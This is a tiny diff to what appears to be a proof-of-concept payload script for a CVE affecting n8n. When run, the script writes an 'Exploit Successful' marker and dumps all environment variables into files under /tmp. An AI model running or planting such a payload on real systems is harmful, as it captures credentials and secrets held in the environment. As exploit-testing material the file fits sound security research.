@@ -1,3 +1,4 @@
+#!/bin/sh
 echo "CVE-2025-62726 Exploit Successful" > /tmp/pwned_n8n.txt
 echo "--- Environment Variables ---" >> /tmp/pwned_env.txt
 env >> /tmp/pwned_env.txt
